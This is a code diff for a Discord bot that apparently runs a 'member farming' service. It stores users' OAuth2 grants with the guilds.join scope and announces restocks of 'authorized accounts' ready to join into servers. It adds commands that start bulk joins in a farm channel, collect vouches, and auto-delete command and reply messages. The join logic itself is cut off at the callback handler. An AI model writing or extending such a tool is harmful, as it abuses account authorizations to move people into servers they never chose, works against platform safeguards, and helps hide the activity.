@@ -1,5 +1,5 @@
 require('dotenv').config();
-const { Client, GatewayIntentBits, EmbedBuilder, ActivityType, ChannelType } = require('discord.js');
+const { Client, GatewayIntentBits, EmbedBuilder, ActivityType } = require('discord.js');
 const express = require('express');
 const axios = require('axios');
 const mongoose = require('mongoose');
@@ -13,12 +13,11 @@ const client = new Client({
     intents: [
         GatewayIntentBits.Guilds, 
         GatewayIntentBits.GuildMessages, 
-        GatewayIntentBits.MessageContent,
-        GatewayIntentBits.DirectMessages 
+        GatewayIntentBits.MessageContent, 
+        GatewayIntentBits.DirectMessages // CRITICAL FOR DMs
     ] 
 });
 
-// IDs
 const ANNOUNCE_CHANNEL = '1521300660988149980';
 const TUTORIAL_CHANNEL = '1520881451606737066';
 const FARM_CHANNEL = '1520843854079852725';
@@ -29,53 +28,51 @@ client.once('ready', () => {
     client.user.setActivity(INVITE_LINK, { type: ActivityType.Watching });
 });
 
+// Auto-delete helper function
+async function autoDelete(msg, delay = 5000) {
+    setTimeout(async () => {
+        try { await msg.delete(); } catch (e) { console.error("Could not delete message"); }
+    }, delay);
+}
+
+// Daily Restock
 cron.schedule('50 01 * * *', async () => {
     const channel = client.channels.cache.get(ANNOUNCE_CHANNEL);
     if (!channel) return;
     const count = await User.countDocuments();
-    const embed = new EmbedBuilder()
-        .setTitle('📢 Member Base Restock')
-        .setDescription(`We have Been Restocked!\n\n**Authorized Accounts Available:** ${count}\n\nGo to <#${FARM_CHANNEL}> to farm.\nGo to <#${TUTORIAL_CHANNEL}> to learn how to farm.\n\n*Powered By Zynx*`)
-        .setColor(0x00FF00);
-    channel.send({ embeds: [embed] }).catch(console.error);
+    channel.send({ embeds: [new EmbedBuilder().setTitle('📢 Member Base Restock').setDescription(`We have Been Restocked!\n\n**Authorized:** ${count}\n\nGo to <#${FARM_CHANNEL}> to farm.\nGo to <#${TUTORIAL_CHANNEL}> to learn how.`).setColor(0x00FF00)] });
 });
 
 client.on('messageCreate', async (msg) => {
     if (msg.author.bot || !msg.guild) return;
 
-    // !auth
     if (msg.content === '!auth') {
         const count = await User.countDocuments();
         const row = { components: [{ type: 1, components: [{ type: 2, label: 'Authorize', style: 5, url: `${process.env.BASE_URL}/login` }] }] };
-        msg.reply({ content: `🔒 **Total Authorized:** ${count}`, components: row.components });
+        const reply = await msg.reply({ content: `🔒 **Total Authorized:** ${count}`, components: row.components });
+        autoDelete(msg, 10000); // Clean up after 10s
     }
 
-    // !djoin (Deletes command message after)
     if (msg.content.startsWith('!djoin')) {
         if (msg.channel.id !== FARM_CHANNEL) return;
         const count = await User.countDocuments();
-        msg.channel.send(`✅ Initializing join for **${count}** members.`);
-        try { await msg.delete(); } catch (e) {}
+        const reply = await msg.channel.send(`✅ Initializing join for **${count}** members.`);
+        autoDelete(msg, 5000);
+        autoDelete(reply, 5000);
     }
 
-    // !vouch (Deletes command, posts to Vouch Channel, DMs User)
     if (msg.content.startsWith('!vouch')) {
         const content = msg.content.replace('!vouch', '').trim();
         if (!content) return msg.reply("Please write a message.");
-        
         const ch = msg.guild.channels.cache.get(VOUCH_CHANNEL);
         if (ch) {
             ch.send({ embeds: [new EmbedBuilder().setTitle('⭐ New Vouch!').setDescription(content).setColor(0xFFFF00).setFooter({ text: `Vouched by ${msg.author.tag}` })] });
         }
-        
-        // DM the user
-        msg.author.send("✅ Thank you for your vouch! We appreciate your support.").catch(() => {});
-        
-        try { await msg.delete(); } catch (e) {}
+        msg.author.send("✅ Thank you for your vouch! We appreciate your support.").catch(e => console.log("DM blocked"));
+        autoDelete(msg, 5000);
     }
 });
 
-// OAuth2 ... (remains the same)
 app.get('/login', (req, res) => res.redirect(`https://discord.com/api/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${process.env.BASE_URL}/callback&response_type=code&scope=identify%20guilds.join`));
 app.get('/callback', async (req, res) => {
     const { code } = req.query;
